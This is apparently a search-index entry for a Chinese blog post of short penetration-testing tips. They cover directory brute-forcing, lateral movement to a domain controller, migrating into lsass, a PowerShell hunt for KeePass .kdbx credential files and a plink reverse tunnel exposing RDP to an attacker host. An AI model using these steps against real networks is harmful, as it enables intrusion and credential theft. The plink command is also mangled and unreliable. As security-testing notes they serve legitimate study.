[{"title":"【Penetration】TIPS","url":"/2022/11/27/%E3%80%90Penetration%E3%80%91TIPS/","content":"<h1 id=\"TIPS\"><a href=\"#TIPS\" class=\"headerlink\" title=\"TIPS\"></a>TIPS</h1><h2 id=\"Tips1：爆破目录加入公司缩写\"><a href=\"#Tips1：爆破目录加入公司缩写\" class=\"headerlink\" title=\"Tips1：爆破目录加入公司缩写\"></a>Tips1：爆破目录加入公司缩写</h2><p>爆破目录加入公司缩写：对目标站点进行目录扫描没有什么收获，只有一些403，把<strong>目标的公司名缩写加在了目录名中</strong>，获取到了一个备份文件。</p>\n<h2 id=\"Tips2：解决访问网站会弹窗要求输入用户名密码的问题\"><a href=\"#Tips2：解决访问网站会弹窗要求输入用户名密码的问题\" class=\"headerlink\" title=\"Tips2：解决访问网站会弹窗要求输入用户名密码的问题\"></a>Tips2：解决访问网站会弹窗要求输入用户名密码的问题</h2><p>解决弹窗要求输入用户名密码的问题：这么顺利的原因全都因为一个浏览器插件<strong>uBlock Origin</strong>。通过检查才发现是插件把这个登录框弹窗当成广告屏蔽了，才导致可以直接绕过弹窗访问。</p>\n<h2 id=\"Tips3：SPN服务横向利用\"><a href=\"#Tips3：SPN服务横向利用\" class=\"headerlink\" title=\"Tips3：SPN服务横向利用\"></a>Tips3：SPN服务横向利用</h2><p>SPN服务横向可以通过打邮服来进行获取域控权限。</p>\n<h2 id=\"Tips4：Windows提权后进程迁移到lsass\"><a href=\"#Tips4：Windows提权后进程迁移到lsass\" class=\"headerlink\" title=\"Tips4：Windows提权后进程迁移到lsass\"></a>Tips4：Windows提权后进程迁移到lsass</h2><p>提权之后做进程迁移，直接把进程迁移到lsass进程中去</p>\n<h2 id=\"Tips5：内网渗透测试中如果远程机器上没有everything的搜索文件的软件的情况下进行重要文件的查找\"><a href=\"#Tips5：内网渗透测试中如果远程机器上没有everything的搜索文件的软件的情况下进行重要文件的查找\" class=\"headerlink\" title=\"Tips5：内网渗透测试中如果远程机器上没有everything的搜索文件的软件的情况下进行重要文件的查找\"></a>Tips5：内网渗透测试中如果远程机器上没有everything的搜索文件的软件的情况下进行重要文件的查找</h2><p>方式1：下载安装一个everything.exe</p>\n<p>方式2：使用powershell进行文件的搜索</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\jason&gt; Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction</span><br><span class=\"line\"></span><br><span class=\"line\">SilentlyContinue</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Tips6：通过PS命令来检查mysql服务的启动类型\"><a href=\"#Tips6：通过PS命令来检查mysql服务的启动类型\" class=\"headerlink\" title=\"Tips6：通过PS命令来检查mysql服务的启动类型\"></a>Tips6：通过PS命令来检查mysql服务的启动类型</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\dave&gt; Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object &#123;$_.Name -like &#x27;mysql&#x27;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Tips7：在非交互式的shell中回复命令提示的方法\"><a href=\"#Tips7：在非交互式的shell中回复命令提示的方法\" class=\"headerlink\" title=\"Tips7：在非交互式的shell中回复命令提示的方法\"></a>Tips7：在非交互式的shell中回复命令提示的方法</h2><p>我们会看到一个提示，询问我们是否要在缓存中存储服务器密钥。</p>\n<p>与不可能接受 SSH 客户端密钥缓存的方式大致相同 来自 Linux 上非 TTY shell 的提示，使用 Plink 时有一些非常有限的 shell Windows，我们也将无法响应此提示。一个简单的解决方案 这种情况是使用 cmd.exe &#x2F;c echo y, Piped 自动进行确认 进入 plink.exe 命令。 这将模拟我们通常的确认出现提示时键入。 整个命令是： </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmd.exe /c echo y | ..exe - ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.</span><br></pre></td></tr></table></figure>\n"}]